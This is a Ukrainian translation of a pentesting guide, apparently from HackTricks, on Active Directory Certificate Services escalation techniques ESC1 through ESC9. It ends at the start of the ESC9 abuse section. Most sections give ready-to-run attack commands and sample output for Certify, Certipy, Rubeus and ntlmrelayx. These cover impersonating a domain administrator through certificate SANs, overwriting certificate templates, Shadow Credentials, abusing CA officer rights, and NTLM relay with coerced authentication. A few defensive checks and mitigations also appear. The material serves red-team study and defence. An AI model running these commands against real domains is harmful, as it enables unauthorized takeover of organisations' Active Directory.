# Ескалація домену AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Це короткий виклад розділів про техніки ескалації з таких публікацій:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Неправильно налаштовані шаблони сертифікатів - ESC1

### Пояснення

### Пояснення неправильно налаштованих шаблонів сертифікатів - ESC1

- **Enterprise CA надає права на реєстрацію користувачам із низькими привілеями.**
- **Схвалення менеджера не потрібне.**
- **Підписи уповноважених осіб не потрібні.**
- **Дескриптори безпеки шаблонів сертифікатів мають надмірно широкі дозволи, що дає користувачам із низькими привілеями права на реєстрацію.**
- **Шаблони сертифікатів налаштовані для визначення EKU, які спрощують автентифікацію:**
- Включено ідентифікатори Extended Key Usage (EKU), такі як Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) або відсутність EKU (SubCA).
- **Шаблон дозволяє запитувачам додавати subjectAltName до Certificate Signing Request (CSR):**
- Active Directory (AD) надає пріоритет subjectAltName (SAN) у сертифікаті під час перевірки особи, якщо він присутній. Це означає, що, вказавши SAN у CSR, можна запросити сертифікат для видачі себе за будь-якого користувача (наприклад, адміністратора домену). Можливість вказувати SAN запитувачем визначається в об’єкті AD шаблону сертифіката через властивість `mspki-certificate-name-flag`. Ця властивість є бітовою маскою, і наявність прапора `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` дозволяє запитувачу вказувати SAN.

> [!CAUTION]
> Описана конфігурація дозволяє користувачам із низькими привілеями запитувати сертифікати з будь-яким бажаним SAN, що дає змогу автентифікуватися від імені будь-якого суб’єкта домену через Kerberos або SChannel.

Цю функцію іноді вмикають для підтримки динамічного створення HTTPS- або host-сертифікатів продуктами чи сервісами розгортання або через недостатнє розуміння її роботи.

Зазначається, що створення сертифіката з цією опцією викликає попередження. Цього не відбувається, якщо наявний шаблон сертифіката (наприклад, шаблон `WebServer`, у якому ввімкнено `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) дублюють, а потім змінюють, додаючи OID для автентифікації.<sup>[[6]](#references)</sup>

### Зловживання

Щоб **знайти вразливі шаблони сертифікатів**, можна виконати:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Щоб **зловжити цією вразливістю для видавання себе за адміністратора**, можна виконати:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Потім ви можете перетворити згенерований **сертифікат у формат `.pfx`** і знову використати його для **автентифікації за допомогою Rubeus або certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Бінарні файли Windows "Certreq.exe" і "Certutil.exe" можна використовувати для генерації PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Перелік шаблонів сертифікатів у схемі конфігурації AD Forest, зокрема тих, що не потребують схвалення або підписів, мають EKU Client Authentication або Smart Card Logon і для яких увімкнено прапорець `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, можна виконати за допомогою такого LDAP-запиту:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Неправильно налаштовані шаблони сертифікатів - ESC2

### Пояснення

Другий сценарій зловживання є варіацією першого:

1. Права на реєстрацію надаються користувачам із низькими привілеями Enterprise CA.
2. Вимогу щодо схвалення менеджером вимкнено.
3. Необхідність авторизованих підписів не задано.
4. Надто дозвільний дескриптор безпеки шаблону сертифіката надає користувачам із низькими привілеями права на реєстрацію сертифікатів.
5. **У шаблоні сертифіката визначено Any Purpose EKU або відсутність EKU.**

**Any Purpose EKU** дає змогу attacker отримати сертифікат для **будь-якої мети**, зокрема для автентифікації клієнта, автентифікації сервера, підписування коду тощо. Для exploit цього сценарію можна застосувати ту саму **technique, що використовується для ESC3**.

Сертифікати **без EKU**, які функціонують як сертифікати subordinate CA, можна exploit для **будь-якої мети**, а **також використовувати для підписування нових сертифікатів**. Отже, attacker може вказати довільні EKU або поля в нових сертифікатах, використовуючи сертифікат subordinate CA.

Однак нові сертифікати, створені для **domain authentication**, не працюватимуть, якщо subordinate CA не має довіри з боку об’єкта **`NTAuthCertificates`**, що є налаштуванням за замовчуванням. Водночас attacker усе ще може створювати **нові сертифікати з будь-яким EKU** та довільними значеннями сертифіката. Їх потенційно можна **abuse** для широкого спектра цілей (наприклад, підписування коду, автентифікація сервера тощо), і вони можуть мати значні наслідки для інших застосунків у мережі, таких як SAML, AD FS або IPSec.<sup>[[6]](#references)</sup>

Щоб enumerate шаблони, які відповідають цьому сценарію в схемі конфігурації AD Forest, можна виконати такий LDAP-запит:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Неправильно налаштовані шаблони Enrolment Agent - ESC3

### Пояснення

Цей сценарій схожий на перший і другий, але **зловживає** **іншим EKU** (Certificate Request Agent) і **2 різними шаблонами** (тому він має 2 набори вимог),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), відомий у документації Microsoft як **Enrollment Agent**, дозволяє principal **отримати** **сертифікат** **від імені іншого користувача**.

**“Enrollment agent”** отримує такий **шаблон** і використовує отриманий **сертифікат для співпідписання CSR від імені іншого користувача**. Потім він **надсилає** **співпідписаний CSR** до CA, отримуючи сертифікат за **шаблоном**, який **дозволяє “enroll on behalf of”**, а CA відповідає **сертифікатом, що належить “іншому” користувачу**.<sup>[[6]](#references)</sup>

**Вимоги 1:**

- Enterprise CA надає low-privileged users права на отримання сертифікатів.
- Вимогу щодо схвалення менеджером пропущено.
- Відсутня вимога щодо авторизованих підписів.
- Дескриптор безпеки certificate template є надмірно permissive і надає low-privileged users права на отримання сертифікатів.
- Certificate template містить Certificate Request Agent EKU, що дозволяє запитувати інші certificate templates від імені інших principals.

**Вимоги 2:**

- Enterprise CA надає low-privileged users права на отримання сертифікатів.
- Схвалення менеджером обходиться.
- Версія схеми template дорівнює 1 або перевищує 2, а також template визначає Application Policy Issuance Requirement, який вимагає Certificate Request Agent EKU.
- EKU, визначений у certificate template, дозволяє domain authentication.
- Обмеження для enrollment agents не застосовуються на CA.

### Зловживання

Ви можете використовувати [**Certify**](https://github.com/GhostPack/Certify) або [**Certipy**](https://github.com/ly4k/Certipy), щоб зловживати цим сценарієм:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Користувачі, яким дозволено **отримувати** **сертифікат агента реєстрації**, шаблони, у яких агентам реєстрації дозволено виконувати реєстрацію, а також **облікові записи**, від імені яких агент реєстрації може діяти, можуть бути обмежені корпоративними CA. Це робиться шляхом відкриття **snap-in** `certsrc.msc`, **клацання правою кнопкою миші на CA**, **вибору Properties**, а потім **переходу** на вкладку “Enrollment Agents”.

Однак зазначається, що **типовим** параметром для CA є “**Не обмежувати агентів реєстрації**”. Коли адміністратори вмикають обмеження для агентів реєстрації, встановлюючи параметр “Обмежити агентів реєстрації”, типова конфігурація все одно залишається надзвичайно дозвільною. Вона надає **Everyone** доступ до реєстрації в усіх шаблонах від імені будь-якого користувача.

## Vulnerable Certificate Template Access Control - ESC4

### **Пояснення**

**Дескриптор безпеки** на **шаблонах сертифікатів** визначає **дозволи**, які мають певні **принципали AD** щодо шаблону.

Якщо **атакер** має необхідні **дозволи**, щоб **змінити** **шаблон** і **впровадити** будь-які **експлуатовані неправильні конфігурації**, описані у **попередніх розділах**, це може сприяти підвищенню привілеїв.

Важливі дозволи, застосовні до шаблонів сертифікатів:<sup>[[6]](#references)</sup>

- **Owner:** Надає неявний контроль над об’єктом, дозволяючи змінювати будь-які атрибути.
- **FullControl:** Надає повний контроль над об’єктом, зокрема можливість змінювати будь-які атрибути.
- **WriteOwner:** Дозволяє змінити власника об’єкта на принципала, контрольованого атакером.
- **WriteDacl:** Дозволяє змінювати елементи керування доступом, потенційно надаючи атакеру FullControl.
- **WriteProperty:** Дозволяє редагувати будь-які властивості об’єкта.

### Abuse

Щоб визначити принципалів із правами редагування шаблонів та інших об’єктів PKI, виконайте перелік за допомогою Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Приклад privesc, подібного до попереднього:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 — це випадок, коли користувач має права на запис до certificate template. Наприклад, цим можна скористатися, щоб перезаписати конфігурацію certificate template і зробити його вразливим до ESC1.

Як видно з наведеного вище шляху, лише `JOHNPC` має ці привілеї, але наш користувач `JOHN` має нове ребро `AddKeyCredentialLink` до `JOHNPC`. Оскільки ця техніка пов’язана із сертифікатами, я також реалізував цю атаку, яка відома як [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Ось невеликий приклад використання команди Certipy `shadow auto` для отримання NT hash жертви.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** може перезаписати конфігурацію шаблону сертифіката однією командою. **За замовчуванням** Certipy **перезаписує** конфігурацію, щоб зробити її **вразливою до ESC1**. Також можна вказати **параметр `-save-old`, щоб зберегти стару конфігурацію**, що буде корисно для **відновлення** конфігурації після нашої атаки.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Контроль доступу до вразливих об’єктів PKI - ESC5

### Пояснення

Розгалужена мережа взаємопов’язаних зв’язків на основі ACL, яка охоплює кілька об’єктів, окрім шаблонів сертифікатів і центру сертифікації, може впливати на безпеку всієї системи AD CS. До цих об’єктів, які можуть суттєво впливати на безпеку, належать:

- Об’єкт комп’ютера AD сервера CA, який може бути скомпрометований за допомогою таких механізмів, як S4U2Self або S4U2Proxy.
- RPC/DCOM сервер сервера CA.
- Будь-який дочірній об’єкт AD або контейнер у межах визначеного шляху контейнера `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Цей шлях охоплює, зокрема, такі контейнери й об’єкти, як контейнер Certificate Templates, контейнер Certification Authorities, об’єкт NTAuthCertificates і контейнер Enrollment Services.

Безпеку системи PKI може бути скомпрометовано, якщо атакувальнику з низькими привілеями вдасться отримати контроль над будь-яким із цих критично важливих компонентів.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Пояснення

Тема, розглянута в [**публікації CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), також стосується наслідків використання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, описаних Microsoft. Ця конфігурація, якщо її активовано на Certification Authority (CA), дозволяє додавати **визначені користувачем значення** до **subject alternative name** для **будь-якого запиту**, зокрема створеного з Active Directory®. Отже, це дає **зловмиснику** змогу виконати enrollment через **будь-який шаблон**, налаштований для **автентифікації** домену, зокрема через ті, що дозволяють enrollment для **непривілейованих** користувачів, наприклад стандартний шаблон User. У результаті можна отримати сертифікат, який дасть змогу зловмиснику автентифікуватися як адміністратор домену або **будь-який інший активний об’єкт** у домені.<sup>[[9]](#references)</sup>

**Примітка**: Спосіб додавання **альтернативних імен** до Certificate Signing Request (CSR) за допомогою аргументу `-attrib "SAN:"` у `certreq.exe` (так звані “Name Value Pairs”) **відрізняється** від стратегії експлуатації SAN в ESC1. Відмінність полягає в **способі інкапсуляції інформації облікового запису** — у атрибуті сертифіката, а не в розширенні.

### Експлуатація

Щоб перевірити, чи активовано цей параметр, організації можуть використати наведену нижче команду з `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ця операція по суті використовує **віддалений доступ до реєстру**, тому альтернативний підхід може полягати в такому:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Інструменти на кшталт [**Certify**](https://github.com/GhostPack/Certify) і [**Certipy**](https://github.com/ly4k/Certipy) здатні виявляти цю неправильну конфігурацію та використовувати її:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Щоб змінити ці налаштування, за умови наявності прав **адміністратора домену** або еквівалентних прав, наведену нижче команду можна виконати з будь-якої робочої станції:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Щоб вимкнути цю конфігурацію у вашому середовищі, прапорець можна видалити за допомогою:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Після оновлень безпеки за травень 2022 року нові **сертифікати** міститимуть **розширення безпеки**, яке містить властивість **`objectSid` запитувача**. Для ESC1 цей SID визначається із зазначеного SAN. Однак для **ESC6** SID відповідає **`objectSid` запитувача**, а не SAN.\
> Для експлуатації ESC6 необхідно, щоб система була вразливою до ESC10 (Weak Certificate Mappings), який надає пріоритет **SAN над новим розширенням безпеки**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Контроль доступу до certificate authority здійснюється за допомогою набору дозволів, які регулюють дії CA. Ці дозволи можна переглянути, відкривши `certsrv.msc`, клацнувши правою кнопкою миші CA, вибравши властивості та перейшовши на вкладку Security. Крім того, дозволи можна перелічити за допомогою модуля PSPKI такими командами:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Це дає уявлення про основні права, а саме **`ManageCA`** і **`ManageCertificates`**, які відповідають ролям «адміністратор CA» і «менеджер сертифікатів» відповідно.<sup>[[6]](#references)</sup>

#### Зловживання

Наявність прав **`ManageCA`** на certificate authority дає принципалу змогу віддалено змінювати налаштування за допомогою PSPKI. Це включає перемикання прапорця **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, щоб дозволити вказувати SAN у будь-якому шаблоні, що є критично важливим аспектом domain escalation.

Спрощення цього процесу можливе за допомогою cmdlet **Enable-PolicyModuleFlag** з PSPKI, який дає змогу вносити зміни без безпосередньої взаємодії з GUI.

Наявність прав **`ManageCertificates`** дає змогу схвалювати запити, що очікують на розгляд, фактично обходячи захист «схвалення менеджером сертифікатів CA».

Комбінацію модулів **Certify** і **PSPKI** можна використовувати для запиту, схвалення та завантаження сертифіката:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Атака 2

#### Пояснення

> [!WARNING]
> У **попередній атаці** дозволи **`Manage CA`** використовувалися для **увімкнення** прапорця **EDITF_ATTRIBUTESUBJECTALTNAME2** з метою виконання **атаки ESC6**, але це не матиме жодного ефекту, доки службу CA (`CertSvc`) не буде перезапущено. Коли користувач має право доступу **`Manage CA`**, йому також дозволено **перезапускати службу**. Однак це **не означає, що користувач може перезапустити службу віддалено**. Крім того, E**SC6 може не працювати з коробки** у більшості середовищ із встановленими патчами через оновлення безпеки від травня 2022 року.

Тому тут наведено іншу атаку.

Передумови:

- Лише дозвіл **`ManageCA`**
- Дозвіл **`Manage Certificates`** (можна надати через **`ManageCA`**)
- Шаблон сертифіката **`SubCA`** має бути **увімкнено** (можна увімкнути через **`ManageCA`**)

Метод ґрунтується на тому, що користувачі з правами доступу `Manage CA` _та_ `Manage Certificates` можуть **створювати невдалі запити на сертифікати**. Шаблон сертифіката **`SubCA`** є **вразливим до ESC1**, але лише **адміністратори** можуть реєструватися в цьому шаблоні. Таким чином, **користувач** може **запросити** реєстрацію в **`SubCA`** — запит буде **відхилено**, — але **згодом сертифікат буде видано менеджером**.<sup>[[6]](#references)</sup>

#### Зловживання

Ви можете **надати собі** право доступу **`Manage Certificates`**, додавши свого користувача як нового уповноваженого.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Шаблон **`SubCA`** можна **увімкнути на CA** за допомогою параметра `-enable-template`. За замовчуванням шаблон `SubCA` увімкнено.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Якщо ми виконали передумови для цієї атаки, можемо почати з **надсилання запиту на сертифікат на основі шаблону `SubCA`**.

**Цей запит буде відхилено**, але ми збережемо приватний ключ і запишемо ID запиту.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Маючи **`Manage CA` та `Manage Certificates`**, ми можемо видати **відхилений запит на сертифікат** за допомогою команди `ca` і параметра `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
І нарешті, ми можемо **отримати виданий сертифікат** за допомогою команди `req` і параметра `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Зловживання розширенням Manage Certificates (SetExtension)

#### Пояснення

На додаток до класичних зловживань ESC7 (увімкнення атрибутів EDITF або схвалення запитів, що очікують), **Certify 2.0** виявив абсолютно новий примітив, для якого потрібна лише роль *Manage Certificates* (також відома як **Certificate Manager / Officer**) на Enterprise CA.<sup>[[3]](#references)</sup>

Метод RPC `ICertAdmin::SetExtension` може виконувати будь-який principal, який має *Manage Certificates*. Традиційно цей метод використовувався легітимними CA для оновлення розширень у **pending**-запитах, однак зловмисник може скористатися ним, щоб **додати *нестандартне* розширення сертифіката** (наприклад, власний OID *Certificate Issuance Policy*, такий як `1.1.1.1`) до запиту, що очікує схвалення.

Оскільки цільовий template **не визначає стандартне значення для цього розширення**, CA НЕ перезапише контрольоване зловмисником значення, коли запит зрештою буде видано. Тому отриманий сертифікат міститиме вибране зловмисником розширення, яке може:

* Відповідати вимогам Application / Issuance Policy інших вразливих templates (що призводить до privilege escalation).
* Додавати додаткові EKU або policies, які надають сертифікату неочікуваний рівень довіри в сторонніх системах.

Коротко кажучи, *Manage Certificates* — раніше вважалося «менш потужною» частиною ESC7 — тепер можна використати для повної privilege escalation або довготривалої persistence без зміни конфігурації CA та без отримання більш обмеженого права *Manage CA*.

#### Зловживання примітивом за допомогою Certify 2.0

1. **Надішліть запит на сертифікат, який залишиться *pending*.** Це можна примусово зробити за допомогою template, що вимагає схвалення менеджером:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Додайте власне розширення до pending-запиту** за допомогою нової команди `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Якщо template ще не визначає розширення *Certificate Issuance Policies*, наведене вище значення буде збережено після видачі.*

3. **Видайте запит** (якщо ваша роль також має права схвалення *Manage Certificates*) або дочекайтеся, поки оператор схвалить його. Після видачі завантажте сертифікат:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Отриманий сертифікат тепер містить шкідливий issuance-policy OID і може використовуватися для подальших атак (наприклад, ESC13, domain escalation тощо).

> ПРИМІТКА:  Ту саму атаку можна виконати за допомогою Certipy ≥ 4.7 через команду `ca` і параметр `-set-extension`.

## NTLM Relay до HTTP-ендпойнтів AD CS – ESC8

### Пояснення

> [!TIP]
> У середовищах, де **встановлено AD CS**, якщо існує **вразливий web enrollment endpoint** і опубліковано принаймні один **certificate template**, що дозволяє domain computer enrollment і client authentication (наприклад, стандартний **`Machine`** template), **будь-який комп’ютер з активною службою spooler може бути скомпрометований зловмисником**!

AD CS підтримує кілька **HTTP-based enrollment methods**, доступних через додаткові server roles, які адміністратори можуть встановити. Ці інтерфейси для HTTP-based certificate enrollment вразливі до **NTLM relay атак**. Зловмисник зі **скомпрометованої машини може видати себе за будь-який AD account, що автентифікується через inbound NTLM**. Видаючи себе за обліковий запис жертви, зловмисник може отримати доступ до цих web-інтерфейсів і **запросити client authentication certificate, використовуючи `User` або `Machine` certificate templates**.

- **Web enrollment interface** (старий ASP-додаток, доступний за адресою `http://<caserver>/certsrv/`) за замовчуванням використовує лише HTTP, що не забезпечує захисту від NTLM relay атак. Крім того, він явно дозволяє лише NTLM authentication через свій Authorization HTTP header, тому безпечніші методи автентифікації, такі як Kerberos, застосувати неможливо.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service і **Network Device Enrollment Service** (NDES) за замовчуванням підтримують negotiate authentication через свій Authorization HTTP header. Negotiate authentication **підтримує і Kerberos, і NTLM**, що дозволяє зловмиснику **понизити автентифікацію до NTLM** під час relay атак. Хоча ці web services за замовчуванням використовують HTTPS, сам по собі HTTPS **не захищає від NTLM relay атак**. Захист web services від NTLM relay атак можливий лише тоді, коли HTTPS поєднано з channel binding. На жаль, AD CS не вмикає Extended Protection for Authentication в IIS, що необхідно для channel binding.<sup>[[6]](#references)</sup>

Поширеною **проблемою** NTLM relay атак є **коротка тривалість NTLM-сесій** і неможливість зловмисника взаємодіяти із services, які **вимагають NTLM signing**.

Однак це обмеження можна подолати, використавши NTLM relay атаку для отримання сертифіката користувача, оскільки тривалість сесії визначається строком дії сертифіката, а сертифікат можна використовувати із services, які **вимагають NTLM signing**. Інструкції щодо використання викраденого сертифіката наведено тут:


{{#ref}}
account-persistence.md
{{#endref}}

Іншим обмеженням NTLM relay атак є те, що **машина під контролем зловмисника має бути автентифікована обліковим записом жертви**. Зловмисник може або чекати, або спробувати **примусово** виконати цю автентифікацію:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Зловживання**

[**Certify**](https://github.com/GhostPack/Certify) за допомогою `cas` перелічує **увімкнені HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Властивість `msPKI-Enrollment-Servers` використовується корпоративними центрами сертифікації (CA) для зберігання кінцевих точок Certificate Enrollment Service (CES). Ці кінцеві точки можна розібрати та перелічити за допомогою інструмента **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Зловживання за допомогою Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Зловживання за допомогою [Certipy](https://github.com/ly4k/Certipy)

За замовчуванням Certipy надсилає запит на сертифікат на основі шаблону `Machine` або `User`, що визначається тим, чи закінчується ім’я облікового запису, який ретранслюється, на `$`. Вказати альтернативний шаблон можна за допомогою параметра `-template`.

Після цього для примусового виконання автентифікації можна застосувати техніку на кшталт [PetitPotam](https://github.com/ly4k/PetitPotam). Під час роботи з контролерами домену необхідно вказати `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Відсутність Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Пояснення

Нове значення **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) для **`msPKI-Enrollment-Flag`**, відоме як ESC9, запобігає вбудовуванню **нового `szOID_NTDS_CA_SECURITY_EXT` security extension** у сертифікат. Цей прапорець стає важливим, коли `StrongCertificateBindingEnforcement` встановлено в `1` (налаштування за замовчуванням), на відміну від значення `2`. Його важливість зростає в сценаріях, де може бути використано слабше зіставлення сертифіката для Kerberos або Schannel (як у ESC10), оскільки відсутність ESC9 не змінила б вимог.<sup>[[7]](#references)</sup>

Умови, за яких налаштування цього прапорця стає важливим:

- `StrongCertificateBindingEnforcement` не встановлено в `2` (значення за замовчуванням — `1`), або `CertificateMappingMethods` містить прапорець `UPN`.
- Сертифікат позначено прапорцем `CT_FLAG_NO_SECURITY_EXTENSION` у налаштуванні `msPKI-Enrollment-Flag`.
- Сертифікат містить будь-який EKU для client authentication.
- Для будь-якого облікового запису, який потрібно скомпрометувати, доступні дозволи `GenericWrite`.

### Сценарій зловживання

